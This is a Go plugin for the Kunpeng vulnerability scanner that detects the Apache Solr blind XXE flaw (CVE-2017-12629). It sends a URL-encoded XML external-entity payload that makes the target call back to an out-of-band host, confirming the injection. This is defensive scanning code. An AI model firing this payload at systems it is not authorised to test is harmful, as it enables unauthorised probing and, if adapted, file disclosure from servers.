package goplugin

import (
	"fmt"
	"net/http"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type apacheSolrXXE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("solr", &apacheSolrXXE{})
}
func (d *apacheSolrXXE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Apache solr XXE漏洞",
		Remarks: "Apache solr Blind XML 实体注入漏洞",
		Level:   1,
		Type:    "XXE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE",
			CVE:  "CVE-2017-12629",
			KPID: "KP-0034",
		},
	}
	return d.info
}
func (d *apacheSolrXXE) GetResult() []plugin.Plugin {
	return d.result
}
func (d *apacheSolrXXE) Check(URL string, meta plugin.TaskMeta) bool {
	if util.GetAiderNetloc() == "" {
		return false
	}
	rand := util.GetRandomString(5)
	aiderURL := fmt.Sprintf("%s/add/%s", util.GetAiderNetloc(), rand)
	poc := "/solr/demo/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22" +
		aiderURL + "%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser"
	request, _ := http.NewRequest("GET", URL+poc, nil)
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if util.AiderCheck(rand) {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
